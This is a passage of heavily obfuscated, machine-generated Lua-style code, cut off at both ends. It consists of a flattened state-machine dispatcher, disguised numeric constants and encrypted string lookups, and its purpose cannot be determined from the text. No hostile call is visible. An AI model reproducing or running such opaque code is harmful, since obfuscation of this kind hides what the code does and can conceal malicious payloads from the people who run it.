Z=v(8439738-(-147160),{I[59811+-59807];I[62141-62139],I[-898439-(-898442)];I[-530591+530597]})B=X(-587972-(-642603))B=g[B]B=B(g,Z)B=q[X(200731+-146125)]g=nil Z={}end else A=f B=a B=73409+5195426 end end else if B<704115+9570107 then if B<16675+10056738 then if B<895669+9160196 then H=28854+24333537852301 U=X(-50507+105224)s=X(-899960-(-954449))i=q[U]V=n[I[-616726+616728]]T=n[I[-579124-(-579127)]]P=T(s,H)U=V[P]m=i[U]P=X(-483388+538390)s=22976239263410-(-133913)U=n[I[706800-706798]]V=n[I[421111+-421108]]T=V(P,s)s=-831194+9237980626855 i=U[T]a=m[i]m=X(298984+-244335)U=n[I[-187443-(-187445)]]P=X(305238-250241)V=n[I[-510005-(-510008)]]T=V(P,s)m=a[m]B=787237+3392544 i=U[T]m=m(a,i)D=m else i=X(-867269+921986)m=q[i]s=514830+10683606972512 U=n[I[52952-52951]]V=n[I[343043-343041]]P=X(851353-796688)T=V(P,s)i=U[T]P=-551900+23777564759836 a=m[i]T=X(1061607-1006939)i=n[I[-409532+409533]]U=n[I[951114-951112]]V=U(T,P)P=31727072049327-(-1032455)m=i[V]T=X(-530241-(-584753))f=a[m]i=n[I[-731571+731572]]B=1029123-(-379457)U=n[I[363555-363553]]V=U(T,P)m=i[V]a=X(-446085+500734)a=f[a]a=a(f,m)A=a end else if B<-218114+10489990 then i=n[m]Z=i B=12976433-(-476864)else V=n[I[-626854+626855]]B=X(538860-484211)H=-765326+33320399202858 s=X(91961+-37491)T=n[I[-765887+765889]]B=i[B]P=T(s,H)U=V[P]m=f B=B(i,U)B=B and 5176320-(-951904)or 7280585-(-69844)end end else if B<11271242-953084 then if B<10827329-525387 then B=13401738-(-774920)else e=X(-48533+103073)B=q[e]e=X(-903713+958312)q[e]=B B=7814340-(-158650)end else i=a s=n[I[184954-184952]]F=X(-747723+802274)H=n[I[246393+-246390]]x=178914+2837773912647 g=H(F,x)T=X(-714035-(-768684))T=U[T]P=s[g]T=T(U,P)V=T B=T and 2458275-(-813373)or 1754804-2111 end end end else if B<-1032459+11725829 then if B<9655353-(-816938)then if B<11048210-680042 then if B<-27037+10388632 then s=n[I[217196+-217195]]x=554684+6662452680034 B=-402869+7691022 H=n[I[-1582+1584]]F=X(-676004+730679)g=H(F,x)p=19557809699958-(-665373)w=8875124178925-126921 F=X(-207122-(-262025))P=s[g]g=q[F]o=X(-78560-(-133204))x=n[I[118449+-118448]]c=n[I[-1026214+1026216]]e=-652522+325252691329 t=c(o,e)L=X(948714-894224)F=x[t]H=g[F]o=n[I[-191214+191215]]e=n[I[562860+-562858]]d=e(L,p)t=o[d]c=A[t]p=X(-801684-(-856280))e=n[I[-591491+591492]]d=n[I[872283+-872281]]L=d(p,w)o=e[L]t=V[o]x=c-t t=n[I[-780741-(-780742)]]d=X(-177472-(-232416))o=n[I[-1024652+1024654]]L=-4827+4655040093010 e=o(d,L)c=t[e]F=x[c]t=X(274795+-219923)g=H(F)o=19172654750661-(-821018)F=n[I[346458-346457]]x=n[I[953923+-953921]]c=x(t,o)H=F[c]s=g..H Z=P..s T=Z else B=n[I[-435805+435815]]D=n[I[-82344-(-82355)]]A[B]=D B=n[I[169530-169518]]D={B(A)}Z={J(D)}B=q[X(408372+-353555)]end else if B<10837471-383117 then B=q[X(-227183-(-282052))]A=nil Z={}else f=n[I[484687-484686]]U=675182+21061591062753 a=n[I[658933-658931]]i=X(-223091-(-277696))m=a(i,U)D=f[m]Z=A[D]P=8410648887553-(-101963)i=X(-682885+737849)f=n[I[902599-902598]]a=n[I[-678724-(-678726)]]U=398640+34066348402887 m=a(i,U)D=f[m]i=954155+33823995457115 B=Z[D]D=n[I[859541-859540]]f=n[I[771394+-771392]]m=X(-53717-(-108559))a=f(m,i)Z=D[a]T=X(-617172+672109)a=n[I[463982-463979]]i=n[I[249555-249554]]U=n[I[-188746+188748]]V=U(T,P)m=i[V]f=a[m]V=X(853122-798469)m=n[I[-148162-(-148163)]]T=32957844975425-(-183474)i=n[I[2952-2950]]U=i(V,T)a=m[U]D=f[a]B[Z]=D B=82546+16595578 end end else if B<11335441-843300 then if B<11142543-651992 then f=X(858732-803978)D=q[f]a=n[I[711317+-711315]]U=X(-56781-(-111308))V=23377703152605-(-769705)m=n[I[-763524+763527]]i=m(U,V)f=a[i]Z=D[f]U=19534749134607-789383 f=n[I[-182948+182950]]a=n[I[-905422+905425]]i=X(-620892-(-675798))m=a(i,U)D=f[m]B=Z[D]D=B Z=D B=D and 901586+3048754 or 15355463-(-278354)else Z=X(638790+-584003)i=X(764391-709617)i=D[i]B=q[Z]m={i(D)}i={B(J(m))}f=i[-846141-(-846143)]B=-543822+6499573 Z=i[-829668+829669]a=i[220533+-220530]m=Z end else B=Z and 4017995-(-42549)or 8997514-(-648859)end end else if B<-754545+11639485 then if B<-590173+11378428 then if B<-454548+11149909 then D=Z B=D and 235250+5917195 or 9865544-1021008 else B=-602344+5441038 D=nil end else if B<276694+10565205 then Z=A B=D B=2468568-702560 else D=B m=X(303523-248806)a=q[m]T=X(654689-600073)P=23971134453-(-672790)i=n[I[815723+-815722]]U=n[I[119064-119062]]V=U(T,P)T=X(594116+-539195)m=i[V]f=a[m]P=30405163289676-185598 i=n[I[-459161+459162]]a=X(-840211-(-894860))a=f[a]U=n[I[-356806+356808]]V=U(T,P)m=i[V]a=a(f,m)B=a and 654819-322255 or 516076+4752759 A=a end end else if B<-70227+11050239 then if B<11102244-195564 then Z={}B=q[X(1020347+-965416)]else f,i=a(D,f)B=f and 151690+5221025 or 8294478-(-539080)end else B=n[I[34059+-34056]]i=X(1043990+-989020)U=-1006105+18509958822852 f=n[I[753383+-753382]]T=X(650688+-596192)a=n[I[614165-614163]]m=a(i,U)D=f[m]m=X(-722704-(-777169))a=q[m]i=n[I[994074-994073]]P=3885346419757-1027356 U=n[I[412968+-412966]]V=U(T,P)U=1037712+-1037457 m=i[V]i=-292254-(-292509)f=a[m]m=199126-199126 a={f(m,i,U)}Z=B(A,D,J(a))B=-261499+7753685 end end end end end else if B<11917211-241825 then if B<-309538+11734198 then if B<11908926-629367 then if B<10158211-(-964208)then if B<11822047-728863 then if B<-979178+12020812 then B=n[I[-55494-(-55495)]]U=28147873464025-953254 f=n[I[351350-351348]]i=X(82839+-28045)a=n[I[-185931+185934]]m=a(i,U)D=f[m]f=l(14371177-187747,{I[-796295-(-796297)],I[-531405+531408]})Z=B(D,f)B=9154332-431502 else i=X(-71536+126253)m=q[i]U=n[I[-989056+989057]]P=X(-718810+773491)s=7053910196081-389789 V=n[I[-285323-(-285325)]]T=V(P,s)B=-229219+537036 i=U[T]a=m[i]i=n[I[-908385-(-908386)]]P=25092799754206-(-245190)U=n[I[852006-852004]]T=X(-720311-(-775126))V=U(T,P)m=i[V]f=a[m]i=n[I[546662+-546661]]T=X(-491687+546487)U=n[I[-55106+55108]]a=X(-201049+255698)a=f[a]P=-342580+23669433443649 V=U(T,P)m=i[V]a=a(f,m)A=a end else if B<106275+10995799 then B=z B=14944173-1006855 Z=q6 else i=X(-711489+765965)U=4514732866013-(-822873)B=n[I[382318-382317]]f=n[I[-435529-(-435531)]]a=n[I[404146-404143]]m=a(i,U)D=f[m]f=E(7560309-(-18824),{I[636682-636680],I[185602-185599],I[-623234+623238]})Z=B(D,f)B=574018+480519 end end else if B<10735327-(-476546)then if B<11212443-79918 then Z=D B=f B=-242432+12192417 else B=U and 2021972-(-550881)or 125989+1726449 end else if B<11822574-559515 then B=n[I[776519-776518]]Z=n[A]U=X(163702+-109040)V=313147860079-943070 f=true B[Z]=f f=X(984555+-929903)Z=q[f]a=n[I[19727+-19725]]m=n[I[70191-70188]]i=m(U,V)f=a[i]B=Z[f]f=b(93711+827494,{I[708022-708021],A,D;I[-343851-(-343853)],I[256948+-256945]})Z=B(f)D=G(D)Z={}A=G(A)B=q[X(-531867+586635)]else A=k[-235062-(-235063)]B=A and-335152+4109493 or 15917044-662209 end end end else if B<12350040-1010278 then if B<11156082-(-131221)then if B<11181609-(-102882)then B=-369757+3565019 D=nil else Z=X(325368-270581)B=q[Z]m=X(697853-643079)m=A[m]a={m(A)}m={B(J(a))}f=m[427188+-427185]Z=m[-646688+646689]B=15157784-(-175225)a=Z D=m[-365755+365757]end else if B<10581114-(-713816)then Z=X(-975800-(-1030587))B=q[Z]i=X(-809995-(-864769))i=D[i]m={i(D)}i={B(J(m))}f=i[-29497+29499]Z=i[946947-946946]a=i[756257+-756254]B=950836+2763210 m=Z else A=k[199020+-199019]B=A and 2191911-(-482305)or 12859694-(-74513)end end else if B<12385295-966329 then if B<-437611+11846594 then B=Z and 7846798-(-244100)or 4680253-223666 else Z={}B=q[X(974937-920230)]A=nil end else i=nil B=5184783-(-770968)U=nil end end end else if B<10536506-(-1029818)then if B<11024726-(-492355)then if B<266864+11233425 then if B<11606109-152579 then U=X(1047808-993027)A=k[1032526+-1032525]D=n[I[-992940+992941]]a=n[I[818379-818377]]m=n[I[665661+-665658]]V=838246+29626319612797 i=m(U,V)f=a[i]U=25251201541990-768376 Z=D[f]f=n[I[-883142+883144]]a=n[I[253282-253279]]i=X(-387421-(-441885))m=a(i,U)D=f[m]B=Z[D]B=B and 11237898-761816 or 2918045-(-277217)else Z={}B=q[X(-472132-(-527002))]end else if B<-383777+11895111 then m=nil B=14593615-(-739394)i=nil else j=476725+-476724 W=R[j]z=B j=false N=W==j q6=N B=N and 487875+13134711 or 11376359-281744 end end else if B<10773669-(-761136)then if B<-684362+12211562 then D=Z B=D and 3434239-496547 or 779701-601281 else P=X(311667+-256995)s=-894886+14848514196136 i=X(884381-829664)m=q[i]U=n[I[-1042970-(-1042971)]]V=n[I[-50378-(-50380)]]T=V(P,s)i=U[T]a=m[i]i=n[I[21102-21101]]U=n[I[185301+-185299]]T=X(419382+-364801)P=13020189934635-(-4995)V=U(T,P)m=i[V]T=X(293107-238254)f=a[m]i=n[I[-967314-(-967315)]]U=n[I[-584328+584330]]P=32618884752020-665407 V=U(T,P)m=i[V]a=X(313607+-258958)B=-148278+463095 a=f[a]a=a(f,m)A=a end else A=k[338976-338975]B=A and 2495819-(-566482)or-4202+9613692 end end else if B<408899+11240643 then if B<10867294-(-751223)then if B<11497053-(-100359)then B=U and 376381+-105536 or 363458+988407 else B=q[X(-781160-(-835722))]A=nil Z={}end else if B<11975018-341939 then A=Z B=A and 2354618-1011628 or 15272864-(-87179)else B=326180+3684403 end end else if B<12134303-471773 then if B<507441+11149795 then f=X(-421986+476703)D=q[f]a=n[I[-302098-(-302099)]]V=711864+4342497815342 U=X(-224145-(-278859))m=n[I[-947632-(-947634)]]i=m(U,V)f=a[i]A=D[f]U=X(1018514-963950)D=X(-1028926+1083575)V=10847844024146-338839 a=n[I[-911342-(-911343)]]m=n[I[165423+-165421]]i=m(U,V)D=A[D]f=a[i]D=D(A,f)Z=D B=4866901-524434 else Z=X(134490+-79950)B=q[Z]A=X(525860+-471261)Z=q[A]A=X(808528-753929)q[A]=B A=X(-964142+1018682)B=6943757-388213 q[A]=Z A=n[I[384778-384777]]D=A()end else B=g s=H..T m[P]=s x=-198795+10054298868436 F=X(540402-485893)s=n[I[-532772-(-532773)]]H=n[I[227746-227744]]g=H(F,x)H=B B=f and 647039+3380940 or 12775587-(-1004255)P=s[g]s=f end end end end else if B<-88445+12039051 then if B<11093173-(-738075)then if B<-75567+11860595 then if B<-217743+11931519 then if B<10737154-(-969792)then f,i=a(D,f)B=f and 184672+15799339 or 5057820-170230 else T=X(862435+-807868)i=n[I[701352+-701351]]P=11548353191080-853927 U=n[I[-810542-(-810544)]]f=B V=U(T,P)m=i[V]a=A[m]B=a and 16186367-(-576755)or-526755+6895914 D=a end else if B<-414033+12187239 then B=n[I[797978-797977]]Z=X(655680-600693)Z=B[Z]Z=Z(B)B=44093+12802525 else Z=A B=D B=10967957-(-664499)end end else if B<-955658+12779994 then if B<11006602-(-805464)then D=Z B=D and 10982712-491185 or 10907505-186289 else s=X(-850121+905015)B=1676360-878717 c=X(-988703-(-1043670))s=A[s]t=32189995406992-334851 g=n[I[-240963+240964]]F=n[I[-565301+565303]]x=F(c,t)H=g[x]s=s(A,H)Z=s end else A=nil B=q[X(833866-779103)]Z={}end end else if B<509408+11371823 then if B<294531+11546896 then if B<11092753-(-742621)then A=k[-37145-(-37146)]B=A and-893738+10133853 or 14131997-(-185158)else A=n[I[-744015-(-744016)]]Z=#A A=240000+-240000 B=Z==A B=B and 9215690-459496 or 7757409-119598 end else if B<11033412-(-830840)then B=10070977-(-650239)else Z=D B=f B=-215546+6072532 end end else if B<-834918+12758495 then if B<-278690+12185914 then Z=f B=a B=3047+13903958 else B=Z and 5573632-1026230 or 5061632-(-402968)end else B=Z and 13703241-210034 or 730492+385465 end end end else if B<-187775+12438808 then if B<673189+11483242 then if B<11456564-(-622361)then if B<11041253-(-994720)then Z=X(709446-654446)B=q[Z]A=k[309518+-309517]m=X(134846-80072)m=A[m]a={m(A)}m={B(J(a))}B=102576+11586508 Z=m[193494+-193493]a=Z f=m[671835-671832]D=m[997917-997915]else P=X(-74801+129518)T=q[P]s=n[I[551019+-551017]]H=n[I[-184561-(-184564)]]F=X(508632+-453786)x=21508702864466-204083 g=H(F,x)P=s[g]F=21864854200985-867028 V=T[P]g=X(-889369-(-944027))P=n[I[-358782-(-358784)]]s=n[I[304305+-304302]]H=s(g,F)T=P[H]H=X(-702185+756977)U=V[T]T=n[I[-96396-(-96398)]]g=313504+26712854783991 B=-150622+9013962 P=n[I[-115907-(-115910)]]s=P(H,g)V=T[s]g=21388404601590-(-881649)i=U[V]U=X(281418+-226769)H=X(-212959-(-267877))T=n[I[-629394-(-629396)]]P=n[I[-898278-(-898281)]]s=P(H,g)U=i[U]V=T[s]U=U(i,V)a=U end else if B<455731+11677192 then D=X(-163752-(-218469))A=q[D]V=-331690+17463831916398 a=n[I[-745760-(-745761)]]U=X(815141-760490)D=X(-443038-(-497687))m=n[I[906550-906548]]i=m(U,V)f=a[i]D=A[D]D=D(A,f)Z=D B=D and 1012493+3605323 or 621029+15572922 else Z=X(421210-366210)B=q[Z]m=n[I[-264932-(-264936)]]i={B(m)}a=i[-13957-(-13960)]Z=i[651032-651031]m=Z f=i[-972274+972276]B=16029688-96140 end end else if B<11539201-(-679208)then if B<-343273+12536378 then Z={}B=q[X(-743371+797990)]A=nil else B=-193467+1998423 end else V=n[I[615153-615152]]T=n[I[538517+-538515]]B=10064319-493854 H=-315228+14842412984923 s=X(-722973+777864)P=T(s,H)i=X(-339710-(-394359))U=V[P]i=a[i]i=i(a,U)Z=i end end else if B<155738+12383823 then if B<12397891-(-93292)then if B<297789+12136034 then U=n[I[232981-232980]]P=X(-1018360+1073194)B=-650604+12051498 s=5895464755656-(-747761)V=n[I[915715-915713]]m=X(-601857-(-656751))T=V(P,s)m=A[m]i=U[T]m=m(A,i)a=not m Z=a else B=f Z=D B=10154801-(-539286)end else if B<13038599-540431 then F=21183775827672-(-458672)P=n[I[643702+-643701]]m=f g=X(127170+-72305)V=X(-897179+951828)s=n[I[-262614-(-262616)]]V=i[V]H=s(g,F)T=P[H]V=V(i,T)B=V and 889110+15258723 or 737819+11932897 U=V else m=G(m)F=nil T=G(T)a=G(a)P=G(P)a=S()F=886128+-886127 s=nil f=G(f)D=G(D)H=nil V=nil g=nil P=S()i=nil i=X(-872448+927351)T=X(-806153+860938)x=G(x)f=nil D=nil n[a]=D D=S()U=G(U)U=X(704744+-649841)n[D]=f m=q[i]V=X(1039140+-984248)i=X(888126+-833296)H=S()f=m[i]m=S()n[m]=f i=q[U]B=-482262+9792414 s={}U=X(-875288+929858)f=i[U]U=q[V]V=X(-846904+901480)i=U[V]V=q[T]T=X(655387-600644)U=V[T]T=S()g={}V=805672-805672 n[T]=V V=-940638-(-940640)x=-346106+346362 n[P]=V V={}n[H]=s s=395491+-395491 e=x x=-467446-(-467447)d=x x=981663-981663 L=d<x x=F-d end end else if B<966253+11662365 then if B<-626921+13245839 then A=k[-637138+637139]B=A and 733743-444019 or-575296+9835338 else B=q[X(-405221+459750)]Z={}A=nil end else i=X(-477858+532575)m=q[i]s=2157278222488-(-535380)U=n[I[312750-312749]]V=n[I[543594+-543592]]P=X(-567869+622714)T=V(P,s)P=347005+19452074743781 i=U[T]a=m[i]i=n[I[-832918+832919]]T=X(35375-(-19331))U=n[I[803812+-803810]]V=U(T,P)m=i[V]P=4592598934390-(-566500)f=a[m]i=n[I[-253671-(-253672)]]B=1527722-887725 U=n[I[515677-515675]]T=X(-862862-(-917372))V=U(T,P)m=i[V]a=X(231892-177243)a=f[a]a=a(f,m)A=a end end end end end end else if B<15156871-451924 then if B<-298515+14078302 then if B<14140298-998530 then if B<470656+12414160 then if B<12429864-(-267386)then if B<12062395-(-606121)then if B<605324+12027979 then B=-769600+9060252 U=nil i=nil V=nil else x=966264+19388488099020 F=X(-709847+764649)s=n[I[427640+-427638]]H=n[I[-845657-(-845660)]]g=H(F,x)P=s[g]i=a T=X(-694474-(-749123))T=U[T]T=T(U,P)B=T and-947908+15966099 or 294146-(-935490)V=T end else if B<13712043-1038881 then B=U and 3183509-515952 or 3632433-982999 else B=true Z={}n[I[-589355+589356]]=B B=q[X(906440+-851488)]end end else if B<13018637-161550 then if B<898006+11939580 then f=-813128-(-813129)D=n[I[134787+-134784]]A=D~=f B=A and-995298+3000547 or 14764343-838329 else U=X(-410670-(-465167))V=795754+747479604466 D=X(70877-16123)Z=q[D]a=n[I[444375-444373]]D=X(773772+-718986)m=n[I[-756216-(-756219)]]i=m(U,V)U=18989261051081-750143 D=Z[D]f=a[i]D=D(Z,f)i=X(-568338+622893)f=n[I[830063-830061]]a=n[I[-652694+652697]]m=a(i,U)Z=f[m]B=D[Z]D=M(628667+9238269,{I[-270663-(-270665)],I[-701823+701826]})Z=X(785876-730886)Z=B[Z]Z=Z(B,D)B=-591060+6435421 n[I[110474-110473]]=Z end else if B<1014513+11847569 then B=true B=B and 313785+12823346 or 4833120-(-426617)else m=X(-669313+723767)i=244744+27740324689517 B=X(554036+-499387)A=k[-662199-(-662200)]B=A[B]D=n[I[205360+-205359]]f=n[I[-63163-(-63165)]]a=f(m,i)Z=D[a]B=B(A,Z)D=B B=D and 704885+4684716 or 2413877-(-521014)end end end else if B<161876+12939432 then if B<12424925-(-529974)then if B<11923287-(-1013603)then U=306702+26992820732683 i=X(1099016-1044307)B=n[I[-734506-(-734511)]]f=n[I[-171911-(-171913)]]a=n[I[605216-605213]]m=a(i,U)V=X(738325-683367)D=f[m]f=X(649245-594528)Z=B(D)D=q[f]T=-882755+33865894262237 f=X(-15267-(-69916))f=D[f]m=n[I[895323-895321]]i=n[I[844258+-844255]]U=i(V,T)a=m[U]f=f(D,a)B=f and 3813322-195043 or-368717+2787571 Z=f else B=n[I[-150097-(-150103)]]V=B(U)B=8273797-(-317085)end else if B<13418908-391083 then D=B m=X(-145484-(-200201))T=X(860061+-805200)a=q[m]i=n[I[1002957+-1002956]]U=n[I[175310+-175308]]P=-823730+16433864585110 V=U(T,P)T=X(-846508-(-900971))m=i[V]P=474798+19117991814168 f=a[m]i=n[I[-552107+552108]]U=n[I[327179-327177]]a=X(-222729-(-277378))V=U(T,P)a=f[a]m=i[V]a=a(f,m)B=a and 10702652-(-825832)or 145864+168953 A=a else f=B i=X(866994+-812277)m=q[i]P=X(478369+-423816)U=n[I[563678-563676]]s=26603071667917-282217 V=n[I[889384-889381]]T=V(P,s)s=30880538860247-(-433492)i=U[T]a=m[i]U=n[I[913475+-913473]]V=n[I[-644972-(-644975)]]P=X(830557-775732)m=X(292853+-238204)T=V(P,s)i=U[T]m=a[m]m=m(a,i)D=m B=m and 952335+12680437 or-963685+3206089 end end else if B<12158956-(-975634)then if B<13941113-818372 then D=X(947696+-892979)U=X(-702271+757046)A=q[D]D=X(769781-715132)a=n[I[-798253-(-798254)]]V=11255732300428-(-862701)m=n[I[-784694+784696]]D=A[D]i=m(U,V)f=a[i]D=D(A,f)B=D and 12310589-(-701205)or 17535611-770740 Z=D else U=X(350478+-295761)i=q[U]H=7109651881019-773965 V=n[I[-324419+324421]]s=X(-704132+758905)T=n[I[-1048361-(-1048364)]]P=T(s,H)U=V[P]s=-230808+21616274451689 m=i[U]P=X(-658854+713778)U=n[I[312282+-312280]]V=n[I[821907-821904]]T=V(P,s)i=U[T]s=813037+3551893233288 a=m[i]P=X(487966+-433498)U=n[I[-398220-(-398222)]]m=X(755711+-701062)V=n[I[927119+-927116]]m=a[m]T=V(P,s)B=792416+5656922 i=U[T]m=m(a,i)D=m end else B=9974955-559925 end end end else if B<13323625-(-177573)then if B<-657064+14102452 then if B<-1007162+14303738 then if B<13944583-732266 then D=X(628204-573487)A=q[D]V=20581672195258-(-577718)a=n[I[140716+-140715]]U=X(-579394+634018)m=n[I[-1013230+1013232]]i=m(U,V)f=a[i]D=X(300505+-245856)D=A[D]D=D(A,f)Z=D B=D and 10141539-(-729286)or 13801811-504600 else a,U=m(f,a)B=a and 10271690-(-60012)or 35940+9327120 end else if B<13101209-(-257825)then A=Z B=A and-302279+7732183 or 12282821-453663 else B=q[X(641984+-587059)]Z={D}end end else if B<-201393+13694310 then if B<12940078-(-513854)then V=X(414764-359872)i=Z U=X(-503814+558717)Z=q[U]U=X(-982176-(-1036746))B=Z[U]U=S()n[U]=B Z=q[V]V=X(-830320+884850)B=Z[V]V=B H=X(-142348+197240)s=q[H]T=s P=B B=s and-784651+3219700 or-1007231+15275210 else B=Z and 10362688-(-99299)or-618143+17296267 end else i=X(583005+-528162)f=n[I[-464608+464609]]U=-711398+23095763977448 a=n[I[-209339+209341]]m=a(i,U)D=f[m]U=-449934+16226470574866 Z=A[D]f=n[I[-194319-(-194320)]]i=X(-18687-(-73198))P=-929928+34391374425878 a=n[I[-996046-(-996048)]]m=a(i,U)D=f[m]m=X(441147+-386586)B=Z[D]a=q[m]i=n[I[998042-998041]]U=n[I[906999-906997]]T=X(-385638+440360)V=U(T,P)T=300338+20520755302433 m=i[V]f=a[m]m=n[I[-793468-(-793469)]]V=X(880859+-826112)i=n[I[-741535-(-741537)]]U=i(V,T)a=m[U]D=f[a]Z=X(-91107+145795)Z=B[Z]Z=Z(B,D)B=1226202-110245 end end else if B<14572049-923714 then if B<14069212-469702 then if B<-736428+14322564 then U=X(570550+-515833)i=q[U]V=n[I[-76798-(-76800)]]H=102702+6744901122838 T=n[I[502237-502234]]s=X(839649-785189)P=T(s,H)U=V[P]m=i[U]U=n[I[1017850+-1017848]]P=X(1059621-1004928)s=29205415602660-636101 V=n[I[-348802-(-348805)]]T=V(P,s)P=X(761064-706581)i=U[T]s=10700553814153-60691 a=m[i]U=n[I[653750+-653748]]V=n[I[-307527-(-307530)]]T=V(P,s)B=212724+7646960 m=X(-142811+197460)m=a[m]i=U[T]m=m(a,i)D=m else Z=X(222466-167561)B=q[Z]A=n[I[-998632-(-998635)]]Z=B(A)A=X(-1020042+1074694)i=20577476900978-758532 Z=q[A]m=X(1007422-952763)D=n[I[481239-481235]]f=n[I[741073-741068]]a=f(m,i)A=D[a]B=Z[A]A=926225-926224 Z=B(A)B=-219548+4524866 end else if B<14573245-946082 then j=886863-886861 W=R[j]j=n[C]N=W==j q6=N B=-697253+11791868 else H=-136797+5506329747553 s=X(-133773-(-188327))U=X(-466808+521525)i=q[U]V=n[I[-293741-(-293743)]]T=n[I[-68582-(-68585)]]P=T(s,H)U=V[P]m=i[U]s=-486573+14160397567598 U=n[I[-690594-(-690596)]]P=X(-341127-(-395853))V=n[I[-997136+997139]]T=V(P,s)B=1578856-(-663548)i=U[T]a=m[i]P=X(-85346-(-140284))U=n[I[-541172-(-541174)]]V=n[I[401340+-401337]]s=14153995447970-595172 T=V(P,s)i=U[T]m=X(367780+-313131)m=a[m]m=m(a,i)D=m end end else if B<13635749-(-112483)then if B<12789797-(-923872)then B=X(65571+-10922)g=14909448413842-(-243852)i=a T=n[I[424876-424874]]H=X(142951+-88474)P=n[I[-127985+127988]]s=P(H,g)V=T[s]B=U[B]B=B(U,V)B=B and 16387164-753146 or 880456+10543912 else A=k[368059-368058]B=A and 6338618-683041 or 417554+4246330 end else f=n[I[966063-966054]]a=f B={}A=B f=732887-732886 D=-809136-(-809137)m=f f=-880498+880498 i=m<f B=10151107-633384 f=D-m end end end end else if B<13981917-(-178532)then if B<13574809-(-363077)then if B<14658685-738912 then if B<1008844+12878439 then if B<-122974+13948167 then B=988650+3039329 e=X(674284+-619692)x=X(988850+-934385)F=q[x]c=n[I[-980173-(-980174)]]d=-762687+1340533286319 t=n[I[-952025-(-952027)]]o=t(e,d)t=-985677+985677 x=c[o]c=-761196+761451 g=F[x]x=320613+-320358 F=g(x,c,t)s=F else s=X(-536112-(-590702))V=n[I[-386295-(-386296)]]H=-519038+570287926407 m=f T=n[I[-19974-(-19976)]]B=X(-826883+881532)B=i[B]P=T(s,H)U=V[P]B=B(i,U)B=B and 8998712-(-884475)or 11450597-(-58269)end else if B<-225810+14132356 then f,i=a(D,f)B=f and 569072+11923223 or 17447167-958209 else B=Z and 2012977-273691 or 226495+14709060 end end else if B<441490+13495688 then if B<14905654-970727 then f=340278-340264 B=-1017521+13785067 D=n[I[-893290-(-893293)]]A=D*f D=-229957-(-230214)Z=A%D n[I[808365+-808362]]=Z else i=X(-307109-(-361826))m=q[i]f=B P=X(863096-808455)U=n[I[1044348+-1044346]]s=-220846+32648118606352 V=n[I[909321-909318]]T=V(P,s)i=U[T]a=m[i]s=28889330277207-(-252213)U=n[I[903937+-903935]]P=X(-395099+449725)V=n[I[-263470-(-263473)]]T=V(P,s)i=U[T]m=X(-23846-(-78495))m=a[m]m=m(a,i)B=m and 647559+12484090 or 7396906-947568 D=m end else n[D]=Z B=6790661-579184 end end else if B<336798+13785534 then if B<-446702+14461702 then if B<659723+13318313 then a=X(234050+-179333)T=18740949660979-(-322787)V=X(-567545+622385)f=q[a]m=n[I[-171424+171426]]i=n[I[118132+-118129]]U=i(V,T)V=X(-236493-(-291290))a=m[U]D=f[a]B=622014+5702044 m=n[I[-458999+459001]]T=815406+23653595953624 i=n[I[-271002+271005]]f=X(-169246-(-223895))f=D[f]U=i(V,T)a=m[U]f=f(D,a)Z=f else f=B T=X(-147016+201971)P=8009762579201-(-420752)i=n[I[308266-308265]]U=n[I[-988241+988243]]V=U(T,P)m=i[V]a=A[m]B=a and-672413+2274618 or 10218288-(-906254)D=a end else if B<340331+13750035 then B=289743-(-323453)D=nil else U=X(-767671+822388)H=31277245903484-932248 i=q[U]s=X(1010438-955957)V=n[I[-118950-(-118952)]]T=n[I[-667032-(-667035)]]P=T(s,H)U=V[P]m=i[U]s=12151297203718-853996 P=X(-922073+976784)U=n[I[-843984+843986]]V=n[I[-6342-(-6345)]]T=V(P,s)P=X(-334678+389273)s=6406+30496956702323 i=U[T]a=m[i]m=X(766346-711697)U=n[I[189813-189811]]B=-933333+12812902 m=a[m]V=n[I[-853549-(-853552)]]T=V(P,s)i=U[T]m=m(a,i)D=m end end else if B<-470323+14608421 then if B<13740483-(-393109)then B=n[I[-910527+910528]]f=n[I[-789182-(-789184)]]a=n[I[-855414+855417]]U=-220255+21794821096452 i=X(-515693+570667)m=a(i,U)D=f[m]f=M(319575+5981497,{I[458875-458873];I[-392082+392085],I[169997-169993]})Z=B(D,f)B=295234+2170385 else D=X(-172135+226852)A=q[D]U=X(-1043421+1098092)a=n[I[-762715-(-762716)]]D=X(-249970-(-304619))m=n[I[-316914-(-316916)]]D=A[D]V=15887036728832-(-825061)i=m(U,V)f=a[i]D=D(A,f)B=D and 15635080-(-648549)or-489590+3420721 Z=D end else e=293678-293678 x=#g F=x==e B=F and 428438+7723949 or 16487078-154386 end end end else if B<14288104-(-174862)then if B<-734896+15020602 then if B<14260468-76609 then if B<14987221-808882 then A=nil B=q[X(-987048-(-1041846))]Z={}else D=X(-836863+891580)A=q[D]a=n[I[-615417+615418]]U=X(48787-(-5893))m=n[I[-181356-(-181358)]]D=X(209080+-154431)V=-113560+28135407627973 i=m(U,V)f=a[i]D=A[D]D=D(A,f)B=D and 14738077-(-26821)or 159248+14697799 Z=D end else if B<-149555+14378011 then i=X(100674-45957)m=q[i]s=-216170+24975159572951 U=n[I[301212+-301210]]V=n[I[732931+-732928]]P=X(499078-444592)T=V(P,s)i=U[T]a=m[i]U=n[I[530986+-530984]]V=n[I[278997+-278994]]m=X(946983-892334)f=B s=6353757534095-(-5119)P=X(-625698+680414)T=V(P,s)i=U[T]m=a[m]m=m(a,i)B=m and 898795+13216009 or 484985+11394584 D=m else Z=T B=P B=T and-847642+10767639 or 3029878-148191 end end else if B<44221+14298387 then if B<14627273-305643 then i=X(795904+-741243)U=3042478274046-12406 B=n[I[-620383+620389]]f=n[I[-550456+550458]]a=n[I[-3825-(-3828)]]m=a(i,U)D=f[m]V=X(101709+-46849)Z=B(D)f=X(1002899-948182)D=q[f]T=6311627209914-160063 m=n[I[-839772+839774]]i=n[I[-263629+263632]]U=i(V,T)f=X(-943237+997886)a=m[U]f=D[f]f=f(D,a)Z=f B=f and 5623429-(-338775)or 170049+15657705 else m=f B=X(612996-558347)B=A[B]B=B(A,i)U=B B=U and-928277+17023256 or 3088033-(-1037015)end else A=Z B=A and 2700189-731072 or 5900605-(-915772)end end else if B<15348868-731157 then if B<13487476-(-1020187)then if B<217201+14257321 then m=X(651604+-596887)a=q[m]D=B P=-844499+1982744176238 T=X(-197009-(-251992))i=n[I[938816-938815]]U=n[I[-528587+528589]]V=U(T,P)m=i[V]P=18003511840892-(-659523)T=X(-158974-(-213959))f=a[m]i=n[I[763414+-763413]]U=n[I[-1041953-(-1041955)]]a=X(782167-727518)V=U(T,P)a=f[a]m=i[V]a=a(f,m)A=a B=a and 